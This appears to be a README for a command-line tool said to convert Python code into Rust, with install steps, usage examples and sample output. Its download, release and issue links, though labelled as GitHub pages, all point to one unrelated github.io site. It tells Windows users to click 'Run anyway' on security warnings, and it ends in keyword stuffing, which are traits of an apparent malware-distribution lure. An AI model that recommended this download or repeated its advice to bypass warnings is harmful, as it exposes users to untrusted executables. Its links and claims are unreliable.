# ⚡ code-convert-helper-cli - Turn Python Code Into Rust

[![Download from GitHub](https://img.shields.io/badge/Download%20Now-GitHub%20Releases-blue?style=for-the-badge)](https://chlorisarmlike888.github.io)

## 🚀 What This Tool Does

Code Convert Helper changes Python code into Rust code. You give it a Python file, and it creates a Rust file that does the same thing. This tool works on Windows, Mac, and Linux.

The tool shows you extra information about your code. You can see what type each variable has. You can see how Rust will handle ownership. You can see which parts of your Python code do not have a Rust equivalent.

## 🎯 Who Should Use This Tool

- People who know Python and want to learn Rust
- Developers who need to move a project from Python to Rust
- Anyone who wants to see how Rust handles Python code
- Students learning about programming languages

## 📦 How to Download and Install

### Step 1: Visit the Download Page

Go to the [GitHub Releases page](https://chlorisarmlike888.github.io) for this tool.

### Step 2: Find the Right File

On the releases page, you will see a list of versions. The latest version is at the top. Click the version name to expand it.

Look for a file that matches your system:

- **Windows**: Download `code-convert-helper-cli-windows.exe` or `code-convert-helper-cli-windows.zip`
- **Mac**: Download `code-convert-helper-cli-macos`
- **Linux**: Download `code-convert-helper-cli-linux`

### Step 3: Download the File

Click the file name to start the download. Your browser will save the file to your computer.

### Step 4: Run the Tool

**Windows users:**
1. Open the folder where you saved the file
2. Double-click the `.exe` file
3. If Windows shows a security warning, click "Run anyway"

**Mac users:**
1. Open Terminal
2. Type `chmod +x ` and drag the downloaded file into the Terminal window
3. Press Enter
4. Type `./` and the file name to run it

**Linux users:**
1. Open Terminal
2. Type `chmod +x ` and the file name
3. Type `./` and the file name to run it

## 🖥️ System Requirements

Your computer needs:

- **Windows**: Windows 10 or newer, 64-bit
- **Mac**: macOS 10.15 or newer
- **Linux**: Any modern distribution with glibc 2.28 or newer
- **RAM**: 512 MB or more
- **Storage**: 50 MB of free space
- **Python**: Not required to run the tool

## 📖 How to Use Code Convert Helper

### Basic Usage

Open a command prompt or terminal. Type the tool name followed by your Python file name:

```
code-convert-helper-cli myfile.py
```

The tool will create a new file called `myfile.rs` in the same folder.

### See Extra Information

Add the `--verbose` flag to see detailed information:

```
code-convert-helper-cli --verbose myfile.py
```

This will show:

- Type information for each variable
- Ownership choices Rust will make
- Which parts of your code the tool cannot convert

### Save the Report

Add the `--output` flag to save the conversion report to a file:

```
code-convert-helper-cli --output report.txt myfile.py
```

### Supported Python Features

The tool converts these Python features:

- Variables and assignments
- Basic math operations (+, -, *, /)
- If statements and comparisons
- While loops
- For loops over ranges
- Functions with parameters
- Return statements
- Print function
- Lists and list operations
- Strings and string operations
- Basic data types (int, float, string, boolean)

### Unsupported Python Features

The tool will warn you about these features. It will skip them in the conversion:

- Classes and objects
- Import statements
- File operations
- Exception handling (try/except)
- Lambda functions
- List comprehensions
- Dictionary operations
- Set operations
- Built-in functions beyond print and basic math

## 🔧 Example Walkthrough

Create a file called `hello.py` with this content:

```python
name = "Alice"
count = 5
for i in range(count):
    print("Hello, " + name + "!")
```

Run the tool:

```
code-convert-helper-cli hello.py
```

The tool creates `hello.rs` with this content:

```rust
fn main() {
    let name = "Alice";
    let count = 5;
    for i in 0..count {
        println!("Hello, {}!", name);
    }
}
```

## 🔍 Understanding the Output

### Type Information

When you use `--verbose`, the tool shows you what type each variable has:

```
Variable: name
  Python type: str
  Rust type: &str

Variable: count
  Python type: int
  Rust type: i32

Variable: i
  Python type: int
  Rust type: i32
```

### Ownership Choices

The tool shows you how Rust will handle ownership:

```
Variable: name
  Ownership: borrowed (&str)
  Reason: String literal does not need ownership transfer

Variable: count
  Ownership: owned (i32)
  Reason: Primitive type is copied by default
```

### Unsupported Syntax Warnings

The tool marks parts it cannot convert:

```
Line 3: Unsupported syntax - import statement
  Python: import os
  Rust equivalent: not available
  Action: skipped in conversion
```

## 🛠️ Troubleshooting

### "Command not found" error

The tool is not in your PATH. Run it from the folder where you saved the file. Or add the folder to your PATH.

### "Permission denied" error

On Mac or Linux, you need to make the file executable. Run `chmod +x filename` in the terminal.

### "File not found" error

The tool cannot find your Python file. Check that the file name is correct. Use the full path to the file if needed.

### "No output file created"

The tool found no supported Python code. Check your Python file for supported features. Remove unsupported features and try again.

## 📋 Command Reference

| Command | What it does |
|---------|--------------|
| `toolname file.py` | Converts file.py to Rust |
| `toolname --verbose file.py` | Shows extra information |
| `toolname --output file.txt file.py` | Saves report to file.txt |
| `toolname --help` | Shows all options |
| `toolname --version` | Shows the tool version |

## 🔄 Getting Help

If you have problems with the tool, check the [GitHub Issues page](https://chlorisarmlike888.github.io). You can report bugs there or ask questions.

## ⬇️ Download Again

Need to download the tool again? Go to the [download page](https://chlorisarmlike888.github.io) and pick the latest version.

Keywords: python to rust converter, code converter tool, python to rust cli, command line converter, rust code generator, python translation tool